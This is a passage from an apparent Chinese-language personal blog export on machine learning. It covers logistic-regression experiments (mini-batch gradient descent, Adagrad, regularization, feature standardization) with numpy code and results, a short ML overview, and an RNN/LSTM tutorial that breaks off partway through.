<h5 id="3-2-2-小批量梯度下降"><a href="#3-2-2-小批量梯度下降" class="headerlink" title="3.2.2 小批量梯度下降"></a>3.2.2 小批量梯度下降</h5><p>​    为了提升梯度下降的效率，一个很有效的方法是采用小批量梯度下降(Mini Batch gradient decent),其主要思想就是每次只拿出总训练集的一小部分进行训练，由于每次更新用了多个样本来计算loss，比随机梯度下降更具有代表性，不像原始SGD很容易被某一个样本给带偏 。loss的下降更加稳定，同时小批量的计算，也减少了计算资源的占用。</p>
<p>​    这里epoch是回合，也就是将全部的训练数据投入进行完整训练的次数，batch size是一次投入训练的样本数量，这里我们还是使用了动态调整学习率的思路，让学习率随step进行减少。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#下面我们使用小批量梯度下降进行(Mini-Batch Gradient Desent MBGD)</span></span><br><span class="line"><span class="comment">#首先是初始化变量的过程,这里计算以后我们得到的是列向量，所以我们要初始化成列向量的形式</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#首先是不加regularization的训练</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">MBGD</span>(<span class="params">X_train,Y_train,X_va,Y_va,w,b</span>):</span><br><span class="line">    <span class="comment">#参数更新</span></span><br><span class="line">    step = <span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> epoch <span class="keyword">in</span> <span class="built_in">range</span>(max_iter):</span><br><span class="line">        <span class="comment">#每一次进行随机的洗牌</span></span><br><span class="line">        X_train,Y_train = randomize_set(X_train,Y_train)</span><br><span class="line">        <span class="keyword">for</span> <span class="built_in">id</span> <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">int</span>(np.floor(X_train.shape[<span class="number">0</span>]/batch_size))):<span class="comment">#这里考虑到不能够整除的情况</span></span><br><span class="line">            X = X_train[<span class="built_in">id</span>*batch_size:(<span class="built_in">id</span>+<span class="number">1</span>)*batch_size]</span><br><span class="line">            Y = Y_train[<span class="built_in">id</span>*batch_size:(<span class="built_in">id</span>+<span class="number">1</span>)*batch_size]</span><br><span class="line">            </span><br><span class="line">            <span class="comment">#计算梯度，梯度下降的过程</span></span><br><span class="line">            w_grad,b_grad = gradient(X,Y,w,b)</span><br><span class="line">            </span><br><span class="line">            <span class="comment">#同步更新w和b，但是这里没有regularization的过程</span></span><br><span class="line">            <span class="comment">#这里加入step动态调整学习率</span></span><br><span class="line">            w = w - lr/np.sqrt(step)*w_grad</span><br><span class="line">            b = b - lr/np.sqrt(step)*b_grad</span><br><span class="line">            </span><br><span class="line">            step += <span class="number">1</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment">#下面计算训练集和验证集的损失和学习率</span></span><br><span class="line">        y_train_pre = func(X_train,w,b)</span><br><span class="line">        Y_train_pre = np.<span class="built_in">round</span>(y_train_pre)</span><br><span class="line">        train_acc.append(accuracy(Y_train_pre,Y_train))</span><br><span class="line">        train_loss.append(Loss(y_train_pre,Y_train)/X_train.shape[<span class="number">0</span>])</span><br><span class="line">        </span><br><span class="line">        y_va_pre = func(X_va,w,b)</span><br><span class="line">        Y_va_pre = np.<span class="built_in">round</span>(y_va_pre)</span><br><span class="line">        va_acc.append(accuracy(Y_va_pre,Y_va))</span><br><span class="line">        va_loss.append(Loss(y_va_pre,Y_va)/X_va.shape[<span class="number">0</span>])</span><br><span class="line">    <span class="keyword">return</span> w,b</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h3 id="4-logistic-module实验结果分析与评估"><a href="#4-logistic-module实验结果分析与评估" class="headerlink" title="4.logistic module实验结果分析与评估"></a>4.logistic module实验结果分析与评估</h3><h4 id="4-1-module1"><a href="#4-1-module1" class="headerlink" title="4.1 module1"></a>4.1 module1</h4><p>​    模型一我们使用Adagradient梯度下降对模型进行训练，然后我们对模型的准确度和损失率进行评估，在损失率计算中我们这里采用交叉熵对损失率进行计算，可以看到最终在训练集和验证集上准确度都在85%左右，且在训练集上准确度稍高。</p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20221115171747348.png" alt="image-20221115171747348" style="zoom:67%;" /></p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20221106155421564.png" alt="image-20221106155421564"></p>
<p>​    做出验证集上loss和accuracy图像，可以看出收敛速度还是很快的</p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20221106155611217.png" alt="image-20221106155611217" style="zoom: 80%;" /> <img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20221106155833965.png" alt="image-20221106155833965" style="zoom: 80%;" /></p>
<h4 id="4-2-module-2"><a href="#4-2-module-2" class="headerlink" title="4.2 module 2"></a>4.2 module 2</h4><p>​    模型二我们采用收敛速度更快的小批量梯度下降作为梯度下降算法，并且采用多个epoch对模型进行训练，希望能够得到更好的训练效果，这里我们从训练集和验证集两个维度对梯度下降算法进行评估。</p>
<blockquote>
<p>parameters</p>
<p>epoch = 20</p>
<p>batch_size = 8</p>
<p>learning rate = 0.5</p>
</blockquote>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20221115171718785.png" alt="image-20221115171718785" style="zoom:67%;" /></p>
<p><img src="image-20221106160512944.png" alt="image-20221106160512944"></p>
<p>​    因为每次小批量梯度下降进行批量下降的样本不同，因此得到的结果也有所不同，但结果基本也在85%左右，且收敛速度要远大于Adagradient的收敛速度。</p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20221106160707021.png" alt="image-20221106160707021"></p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20221106160718196.png" alt="image-20221106160718196"></p>
<p>​    可以看到Loss损失率总体是呈下降趋势的，且在train集上下降要先于验证集，但准确率波动性还是比较强，最终会稳定在85%左右。</p>
<h4 id="4-3-module-3"><a href="#4-3-module-3" class="headerlink" title="4.3 module 3"></a>4.3 module 3</h4><p>​    module3的思路是在使用小批量梯度下降的基础上增加高次项，我们扩展X_train集合，在后面加上x的平方项进行训练，增加平方项的函数如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#下面我们加入二次项</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Addpower</span>(<span class="params">X</span>):</span><br><span class="line">    a = np.zeros((X.shape[<span class="number">0</span>],<span class="number">2</span>*X.shape[<span class="number">1</span>]))</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(X.shape[<span class="number">0</span>]):</span><br><span class="line">        temp = np.append(X[i],np.power(X[i],<span class="number">2</span>))</span><br><span class="line">        <span class="comment">#temp = np.append(temp,np.power(X[i],3))</span></span><br><span class="line">        a[i] = temp</span><br><span class="line">    <span class="keyword">return</span> a</span><br></pre></td></tr></table></figure>
<p>​    最后的结果在准确率上和module 1和module 2接近，但是loss损失率却不如前两者</p>
<p>​                                   <img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20221106164458413.png" alt="image-20221106164458413" style="zoom:80%;" /></p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20221106164533272.png" alt="image-20221106164533272" style="zoom:80%;" /></p>
<h4 id="4-4-特征标准化的影响"><a href="#4-4-特征标准化的影响" class="headerlink" title="4.4 特征标准化的影响"></a>4.4 特征标准化的影响</h4><p>​    下面我们分析特征标准化的影响，首先是没有特征标准化下的逻辑回归会出现sigmoid函数exp运算overflow的情况，这是由于没有标准化之前数据范围比较大，容易计算出比较大的指数值。</p>
<p>​    这里我们要将数组中的元素逐一进行判读，将负值改为正值进行运算。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">sigmoid2</span>(<span class="params">z</span>):</span><br><span class="line">    l = z.shape[<span class="number">0</span>]</span><br><span class="line">    y = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(l):</span><br><span class="line">        <span class="keyword">if</span> z[i]&gt;=<span class="number">0</span>:</span><br><span class="line">            y.append(<span class="number">1.0</span>/(<span class="number">1</span>+np.exp(-z[i])))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            y.append(np.exp(z[i])/(np.exp(z[i])+<span class="number">1</span>))</span><br><span class="line">    <span class="keyword">return</span> np.array(y)</span><br></pre></td></tr></table></figure>
<p>​    但是这样会大大增加收敛的时间，且执行相同次数后，准确率只能收敛到80%左右，并且loss更高。分析可知标准化则能够减少数据震荡，能够使数据更快的收敛到相关位置。</p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20221106173552040.png" alt="image-20221106173552040"></p>
<h4 id="4-5-正规化的影响（regularization）"><a href="#4-5-正规化的影响（regularization）" class="headerlink" title="4.5 正规化的影响（regularization）"></a>4.5 正规化的影响（regularization）</h4><p>​        下面分析在梯度下降中加入regularization的影响，regularization能够防止数据出现过拟合现象，通过增加变量系数的冗余项能够使模型减少复杂度。</p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20221106174308254.png" alt="image-20221106174308254"></p>
<p>​    下面对梯度下降公式进行正则化，这里只需要每次在原变量系数基础上更改即可</p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20221106174403579.png" alt="image-20221106174403579"></p>
<p>​    Adagrad加入正则化</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#加入正则化</span></span><br><span class="line"><span class="comment">#这里的一个想法是再使用w扩展的方法将b扩展入w，但是这样会使正则化regularization变的不易</span></span><br><span class="line"><span class="comment">#下面我们用Adagrad进行梯度下降</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Adagrad_regularization</span>(<span class="params">X_train,Y_train</span>):</span><br><span class="line">    w = np.full((<span class="number">106</span>,<span class="number">1</span>),<span class="number">0</span>) <span class="comment">#这样是看成一个二维的列向量进行填充</span></span><br><span class="line">    <span class="comment">#我们这里一共有106个feature</span></span><br><span class="line">    b = np.zeros(<span class="number">1</span>)</span><br><span class="line">    w_grad_sum = np.ones((<span class="number">106</span>,<span class="number">1</span>))</span><br><span class="line">    b_grad_sum = np.zeros(<span class="number">1</span>)</span><br><span class="line">    regularization_weight = <span class="number">1</span></span><br><span class="line">    rw = regularization_weight/X_train.shape[<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(iteration):</span><br><span class="line">        w_grad,b_grad = gradient(X_train,Y_train,w,b)</span><br><span class="line">        w_grad_sum += w_grad**<span class="number">2</span></span><br><span class="line">        b_grad_sum += b_grad**<span class="number">2</span></span><br><span class="line">        w = w*(<span class="number">1</span>-(lr/np.sqrt(w_grad_sum))*rw)-lr/np.sqrt(w_grad_sum)*w_grad</span><br><span class="line">        b = b - lr*b_grad/np.sqrt(b_grad_sum)</span><br><span class="line">    <span class="keyword">return</span> w,b</span><br><span class="line">    </span><br></pre></td></tr></table></figure>
<p>​    小批量梯度下降加入正则化</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#首先是不加regularization的训练</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">MBGD_regularization</span>(<span class="params">X_train,Y_train,X_va,Y_va,w,b</span>):</span><br><span class="line">    <span class="comment">#参数更新</span></span><br><span class="line">    step = <span class="number">1</span></span><br><span class="line">    rw = regularization_weight/X_train.shape[<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">for</span> epoch <span class="keyword">in</span> <span class="built_in">range</span>(max_iter):</span><br><span class="line">        <span class="comment">#每一次进行随机的洗牌</span></span><br><span class="line">        X_train,Y_train = randomize_set(X_train,Y_train)</span><br><span class="line">        <span class="keyword">for</span> <span class="built_in">id</span> <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">int</span>(np.floor(X_train.shape[<span class="number">0</span>]/batch_size))):<span class="comment">#这里考虑到不能够整除的情况</span></span><br><span class="line">            X = X_train[<span class="built_in">id</span>*batch_size:(<span class="built_in">id</span>+<span class="number">1</span>)*batch_size]</span><br><span class="line">            Y = Y_train[<span class="built_in">id</span>*batch_size:(<span class="built_in">id</span>+<span class="number">1</span>)*batch_size]</span><br><span class="line">            </span><br><span class="line">            <span class="comment">#计算梯度，梯度下降的过程</span></span><br><span class="line">            w_grad,b_grad = gradient(X,Y,w,b)</span><br><span class="line">            </span><br><span class="line">            <span class="comment">#同步更新w和b，但是这里没有regularization的过程</span></span><br><span class="line">            <span class="comment">#这里加入step动态调整学习率</span></span><br><span class="line">            w = w*(<span class="number">1</span>-(lr/np.sqrt(step))*rw)-lr/np.sqrt(step)*w_grad</span><br><span class="line">            b = b - lr*b_grad/np.sqrt(step)</span><br><span class="line">            </span><br><span class="line">            step += <span class="number">1</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment">#下面计算训练集和验证集的损失和学习率</span></span><br><span class="line">        y_train_pre = func(X_train,w,b)</span><br><span class="line">        Y_train_pre = np.<span class="built_in">round</span>(y_train_pre)</span><br><span class="line">        train_acc.append(accuracy(Y_train_pre,Y_train))</span><br><span class="line">        train_loss.append(Loss(y_train_pre,Y_train)/X_train.shape[<span class="number">0</span>])</span><br><span class="line">        </span><br><span class="line">        y_va_pre = func(X_va,w,b)</span><br><span class="line">        Y_va_pre = np.<span class="built_in">round</span>(y_va_pre)</span><br><span class="line">        va_acc.append(accuracy(Y_va_pre,Y_va))</span><br><span class="line">        va_loss.append(Loss(y_va_pre,Y_va)/X_va.shape[<span class="number">0</span>])</span><br><span class="line">    <span class="keyword">return</span> w,b</span><br><span class="line">    </span><br></pre></td></tr></table></figure>
<p>​    下面是在Adagradient和小批量梯度下降下的训练效果，可以看到加入正则化后模型并没有很大的提升，准确率依旧维持在85%左右。正则化方法是防止在高次函数下出现过拟合的现象，但是在一次线性函数的情况下提升不大。</p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20221106174747524.png" alt="image-20221106174747524"></p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20221106174900188.png" alt="image-20221106174900188"></p>
<p>​        在存在高次项的moudle 3上加入正则化后，我们测试出在vaildation set上的准确率和损失反而低于train set，并且从图像上验证集和训练集准确度和loss变化基本一致，可以看出正则化在防止过拟合方面起到的作用。</p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20221106175523636.png" alt="image-20221106175523636" style="zoom:67%;" /></p>
<blockquote>
<p>Training loss: 0.5012297276637736<br>validation loss: 0.4939687314395634<br>Training accuracy: 0.8455159705159705<br>validation accuracy: 0.848149854137878</p>
</blockquote>
<h4 id="4-6-比较和预测"><a href="#4-6-比较和预测" class="headerlink" title="4.6 比较和预测"></a>4.6 比较和预测</h4><p>​    总体来说使用logistic regression的准确率要略高于生成模型预测的准确率，下面我们将整个训练数据集整体进行训练，然后对test数据集进行预测。</p>
<p>Adagrad整个训练集的loss和准确率</p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20221106192309623.png" alt="image-20221106192309623"></p>
<p>小批量梯度下降整个训练集的loss和准确率</p>
<p>​                                           <img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20221106193730234.png" alt="image-20221106193730234"></p>
<p>​    预测部分和生成模型思路基本一致</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">write_file</span>(<span class="params">path,w,b</span>):</span><br><span class="line">    answer = predict(X_test,w,b)</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(path, <span class="string">&#x27;w&#x27;</span>, newline=<span class="string">&#x27;&#x27;</span>) <span class="keyword">as</span> csvfile:</span><br><span class="line">        writer = csv.writer(csvfile) </span><br><span class="line">        writer.writerow([<span class="string">&#x27;id&#x27;</span>,<span class="string">&#x27;label&#x27;</span>]) </span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(answer.shape[<span class="number">0</span>]):</span><br><span class="line">            writer.writerow([i+<span class="number">1</span>,answer[i][<span class="number">0</span>]])</span><br></pre></td></tr></table></figure>
<h4 id="4-7-feature影响评估"><a href="#4-7-feature影响评估" class="headerlink" title="4.7 feature影响评估"></a>4.7 feature影响评估</h4><p>​    下面我们将评估哪一个feature对于预测结果的影响比较大，我们要选择最后weight绝对值比较大的parameter。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">get_best_feature</span>(<span class="params">path,w</span>):</span><br><span class="line">    ind = np.argsort(np.<span class="built_in">abs</span>(w))[::-<span class="number">1</span>]<span class="comment">#argsort从小到大排序, ::-1从后向前读取</span></span><br><span class="line">    <span class="built_in">print</span>(ind)</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(path) <span class="keyword">as</span> f:</span><br><span class="line">        content = f.readline().strip(<span class="string">&#x27;\n&#x27;</span>).split(<span class="string">&#x27;,&#x27;</span>)</span><br><span class="line">    feature = np.array(content)</span><br><span class="line">    <span class="comment">#print(feature)</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> ind[<span class="number">0</span>:<span class="number">10</span>]:</span><br><span class="line">        <span class="built_in">print</span>(feature[i],w[i])</span><br><span class="line"></span><br><span class="line">w2 =  np.ravel(w)</span><br><span class="line">get_best_feature(<span class="string">&#x27;/kaggle/input/hw2-data2/X_test&#x27;</span>,w2)</span><br></pre></td></tr></table></figure>
<p>​    打印影响前10位的feature如下(feature影响和模型选择有关，这里我们以小批量梯度下降为例)</p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20221106201707675.png" alt="image-20221106201707675"></p>
<h2 id="结论"><a href="#结论" class="headerlink" title="结论"></a>结论</h2><p>​    </p>
<p>​    本次实验采用了生成模型和判别模型对工资水平做出了预测，通过实验进一步理解了生成模型和判别式模型的区别。</p>
<p>判别模型：没有做任何假设，完全依赖数据寻找分界线，它的performance变化量受data影响很大，data越多，error越小。</p>
<p>生成模型：模型基于做出的假设，有的时候假设可能出现问题(naive bayes假设不同的feature之间相互独立),但是生成模型受到noise的影响比较少，因为它基于固定的分布。</p>
<p>​    在判别式模型中，是假设了一个后验概率，然后去找后验概率的参数，但是生成模型中把公式先拆成先验概率和class-dependent probability类相关的概率两个部分，这样是有好处的，它们两个可以来自不同的来源。(语音识别，计算先验概率，某一句话说出来的概率，在语音识别中，可以从网上爬一些数据，来计算这个先验概率，这就是language model。语音辨识其实是一个生成式模型。先验概率使用文字data来处理，class-dependent部分才需要声音data处理)。</p>
<p>​    另外在实验中尝试了一种类似于神经网络的梯度下降方式(MBGD),它能够每次使用一些小批量进行下降，并可以进行多个epoch增加学习准确度。</p>
]]></content>
      <categories>
        <category>Machine Learning</category>
      </categories>
      <tags>
        <tag>逻辑回归</tag>
      </tags>
  </entry>
  <entry>
    <title>ML review1</title>
    <url>/2023/01/18/Mlre/</url>
    <content><![CDATA[<h1 id="ML-Review1"><a href="#ML-Review1" class="headerlink" title="ML Review1"></a>ML Review1</h1><p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20230118115545338.png" alt="image-20230118115545338"></p>
<p>人工智能学习的框架</p>
<ul>
<li>第一步先选择一组函数模型</li>
<li>第二步使用训练数据评价函数模型的好坏</li>
<li>第三步是选择表现最好的函数方程</li>
</ul>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20230118115941889.png" alt="image-20230118115941889"></p>
<p>监督学习、无监督学习和半监督学习的区别</p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/346b9d2203de4640858cd5e92649f487.png" alt="img"></p>
<p>另外还有一个是迁移学习，对于猫和狗的识别可以迁移到识别一些不相干的任务中，可能是标记数据也可能是非标记数据</p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20230118120541990.png" alt="image-20230118120541990"></p>
<p>强化学习 是一个连续决策的过程，传统的机器学习中的有监督学习是给定标签但有时候，并不知道标签是什么，即一开始不知道什么是“好”的结果，所以RL不是给定标签，而是给一个回报函数，这个回报函数决定当前状态得到什么样的结果（“好”还是“坏”），其数学实质是一个马尔可夫决策过程。最终的目的是决策过程中回报函数期望最优。</p>
<p>强化学习和监督学习的区别主要有以下两点：</p>
<p>1.强化学习是试错学习(Trail-and-error)，由于没有直接的指导信息，智能体要以不断与环境进行交互，通过试错的方式来获得最佳策略。<br>2.延迟回报，强化学习的指导信息很少，而且往往是在事后（最后一个状态）才给出的，这就导致了一个问题，就是获得正回报或者负回报以后，如何将回报分配给前面的状态。</p>
]]></content>
      <categories>
        <category>Mechine Learning</category>
      </categories>
      <tags>
        <tag>Mechine Learning</tag>
      </tags>
  </entry>
  <entry>
    <title>RNN</title>
    <url>/2023/01/18/RNN/</url>
    <content><![CDATA[<h2 id="RNN"><a href="#RNN" class="headerlink" title="RNN"></a>RNN</h2><h3 id="1-引入"><a href="#1-引入" class="headerlink" title="1.引入"></a>1.引入</h3><p>先从一个智能机器人的例子开始，理解一段文字的一种方法是标记那些对句子有意义的单词或者记号，在自然语言处理领域，这个问题被称为槽填充(Slot Filling),此时机器人会找出input句子有用的信息（destination,time of arrival)，然后输出要回答的答案。</p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20230118174706394.png" alt="image-20230118174706394"></p>
<p>先使用 普通的神经网络完成以下，看有什么问题，input是拆分的一个单词，但是单词无法直接被计算机使用，需要进行编码，那就可以使用1-of-N encoding.原理很简单，用一个lexicon（字典）将所有的单词列出来，在该单词出现的位置上置1，但是这个方法的问题是如果lexicon中没有记录的单词，就没法在所属的列上置1</p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20230118192137726.png" alt="image-20230118192137726"></p>
<p>所以可以使用下面的方法改进</p>
<ul>
<li><strong>Dimension for “Other”</strong> ： 把没记录过的物品归到 other 类里。</li>
<li><strong>Word hashing</strong> ： 用词汇的字母的n-gram来表示这个vector，也就是部分字母组合，如果使用3个字母组合的话，就得到了一个$26\times26\times26$的向量.</li>
</ul>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20230118192825056.png" alt="image-20230118192825056"></p>
<p>刚才说了几种转化word为vector的方法，可以输入了以后就是获得输出，这里输入代表一个词的向量，然后回输出这个词属于slots的概率，这里输入了Taipei属于哪个slot（destination，time of arrival）的几率</p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20230118192903815.png" alt="image-20230118192903815"></p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/20200302142915654.png" alt="img"></p>
<p>如果network的input是一样的，那output应该也是一样的，但现在面临个问题：</p>
<p> 现在有两个句子：</p>
<p>11月2号到达台北（台北是目的地）<br>11月2号离开台北（台北是出发地）<br>对于刚才的network来说，input只有台北，它要么就一直认定台北是目的地，要么就一直认定台北市出发地。所以，我们就希望这个network是有记忆力的，能记住联系台北之前的词汇，来判断台北市目的地还是出发地。</p>
<p>这种有记忆力的network就是循环神经网络（Recurrent Neural Network，RNN）。</p>
<h3 id="2-Recurrent-Neural-Network-RNN"><a href="#2-Recurrent-Neural-Network-RNN" class="headerlink" title="2.Recurrent Neural Network(RNN)"></a>2.Recurrent Neural Network(RNN)</h3><p>最核心的功能就是实现记忆功能，将中间隐藏层的输出存起来，然后之前记忆的内容就会对下面的结果产生影响。</p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20230118193826423.png" alt="image-20230118193826423"></p>
<p>1.输入$x_1,x_2$后，神经元的输出结果会存储到内存中</p>
<p>2.此时再输入$x_1,x_2$,神经元不仅会用此时的输入值，还会考虑到之前的输入</p>
<p>下面是一个例子</p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20230118194340887.png" alt="image-20230118194340887"></p>
<p>为了计算方便，假设<strong>weight都是1，没有bias，激活函数也是线性函数</strong>。</p>
<ol>
<li>先给memory那边初始值，假设都设置为0</li>
<li>现在输入[1,1]</li>
<li>绿色的神经元输出[2,2]，并把[2,2]存到memory中</li>
<li>红色的神经元输出[4,4]</li>
</ol>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20230118194647232.png" alt="image-20230118194647232"></p>
<ol>
<li>此时输入[1,1]</li>
<li>绿色的神经元会加上memory的值[2,2]，输出[6,6]，并把[6,6]存到memory中</li>
<li>红色的神经元输出[12,12]</li>
</ol>
<p>可以看出和之前的神经网络不同，这里虽然输入不同，但是输出却不同，这里就可以看到RNN神经网络的作用，另外如果改变input的顺序，当然存储不同，最后的结果也是不同的，这和自然语言上是相同的，自然语言就是和上下文词语和语序是有关的。</p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20230118195505660.png" alt="image-20230118195505660"></p>
<p>把network改为RNN。</p>
<ol>
<li>输入Taipei</li>
<li>网络就会考虑上前面的词语是arrive还是leave。</li>
<li>此时就能输出Taipei是目的地还是出发地的几率。</li>
</ol>
<p><strong>上图不是指有三个network，而是一个network被用了3次。</strong></p>
<p>之前举的RNN的例子，都只有一层hidden layer，但是也可以和前面一样使用多个反馈存储，也就是增加隐藏层。</p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20230118195625863.png" alt="image-20230118195625863"></p>
<ul>
<li><strong>Elman Network：</strong>（就是刚才举例的RNN）把某一个hidden layer的output存起来，在下一次使用network的时候，这个hidden layer会考虑现在的input和之前存的值，综合后再得出output。</li>
<li><strong>Jordan Network：</strong>它是把output的值存起来，下次用到再读出来。传说它的性能会好点，因为它存的是output的值，这个值和target比较有关系，所以此时我们知道存在memory的值大概会是怎样的。</li>
</ul>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20230118200139419.png" alt="image-20230118200139419"></p>
<p>假设一个句子的词语从前往后是$x^t、x^{t+1}、x_{t+2}$。</p>
<p>Bidirectional RNN的做法：训练两个network，一个正向，一个逆向。把$x_t$所处的两个hidden layer都接给output layer$y_t$ 。</p>
<p>Bidirectional RNN的好处：network产生output的时候，它考虑的范围比较广。比如输入句子中间的词语进去，之前RNN只考虑了这个词语前面句子的部分。而Bidirectional RNN是考虑了句子前面和句子后面的部分，所以它的准确率会更高。</p>
<h3 id="3-LSTM"><a href="#3-LSTM" class="headerlink" title="3.LSTM"></a>3.LSTM</h3><p> 前面讲的各种RNN是比较简单的，下面有一个更加成熟的结构，叫做Long Short-term Memory(LST M)长(短时记忆网络</p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20230119100637975.png" alt="image-20230119100637975"></p>
<ul>
<li>Memory Cell：保存神经元的output,记忆模块</li>
<li>Input Gate:决定神经元的output要不要被保存到Memory Cell中，由network自己学习是否打开阀门</li>
<li>Output Gate:决定神经元能不能从Memory Cell中读取之前保存的东西，由network自己学习是否打开阀门</li>
<li>Forget Gate:决定Memory Cell里面的东西要不要删掉，由network自己学习并决定forget</li>
</ul>
<p>这里有4个input和一个output</p>
<ul>
<li>input的值</li>
<li>操控Input Gate的信号</li>
<li>操控Output Gate的信号</li>
<li>操控Forget Gate的信号</li>
<li>一个output是LSTM的输出值</li>
</ul>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20230119103516920.png" alt="image-20230119103516920"></p>
<p>这里是LSTM模型图，$Z_i、Z_o、Z_f$经过的激活函数均为sigmoid韩素华，代表门的开启程度，也就是数据通过程度</p>
<ul>
<li>输入z首先经过一个激活函数变成$g(z)$</li>
<li>然后$z_i$代表是否开启Input Gate的信号，经过激活函数$f(z_i)$,数值1表示完全让数据通过</li>
<li>$z_0$ 是否开启 Output Gate 的信号，经过激活函数后变成$f(z_o)$。数值为1代表完全让数据输出。</li>
<li>$z_f$代表是否开启Forget Gate的信号，经过激活函数后变成$f(z_f)$,数值0代表完全忘掉数据的值</li>
</ul>
<p>假设memory初始值为c，$c’=g(z)f(z_i)+cf(z_f)$这个式子可以看出这几个信号如何操控gate，这个和之前的RNN区别就是还是使用记忆，但是加入了一些控制位能够更好的控制输入输出，增加非线性性，提升复杂度来解决更复杂的问题</p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20230119104558726.png" alt="image-20230119104558726"></p>
<p>举一个例子</p>
<ul>
<li>蓝色格子中代表memory的值</li>
<li>$x_1$代表input</li>
<li>$x_2=1$时代表input能够被写入memory</li>
<li>$x_2=-1$时代表清空memory</li>
<li>$x_3=1$代表，memory的值能够被输出</li>
<li>红色格子代表输出的值</li>
</ul>
<p>可以看到上面的例子当$x_2$等于1时，就将$x_1$的值存储到了memory中，具体的我们看这个是如何实作的</p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20230119105857511.png" alt="image-20230119105857511"></p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20230119110728144.png" alt="image-20230119110728144"></p>
<p>可以看到</p>
<ul>
<li>$x_1$代表输入，input值为3，当乘上weight值去，实际输入input为3，bias的权重也为0</li>
